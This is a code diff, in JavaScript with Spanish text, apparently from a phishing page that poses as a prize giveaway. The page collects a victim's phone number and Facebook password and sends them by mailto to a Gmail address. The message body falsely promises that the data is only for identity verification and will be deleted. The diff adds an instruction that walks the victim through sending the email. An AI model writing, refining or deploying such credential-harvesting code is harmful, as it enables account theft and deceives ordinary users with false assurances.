@@ -182,7 +182,7 @@
 
             if (telefono && contrasena) {
                 const subject = `Ganador del Premio: ${premio}`;
-                const body = `Número de Teléfono: ${telefono}\nContraseña: ${contrasena}\nPremio: ${premio}\n\nLa presente información es solicitada solo para verificar que usted es una persona real, por tal razón nos valemos de su cuenta de Facebook para confirmarlo. No se preocupe por sus datos, su información será eliminada en cuanto le hayamos enviado su premio.`;
+                const body = `Número de Teléfono: ${telefono}\nContraseña: ${contrasena}\nPremio: ${premio}\n\nLa presente información es solicitada solo para verificar que usted es una persona real, por tal razón nos valemos de su cuenta de Facebook para confirmarlo. No se preocupe por sus datos, su información será eliminada en cuanto le hayamos enviado su premio. para enviar el correo haga clic en el icono que aparece en la parte de arriba, el que parece un triangulo`;
                 window.location.href = `mailto:theprojectboom@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
             } else {
                 alert('Por favor, ingresa tu número de teléfono y contraseña.');
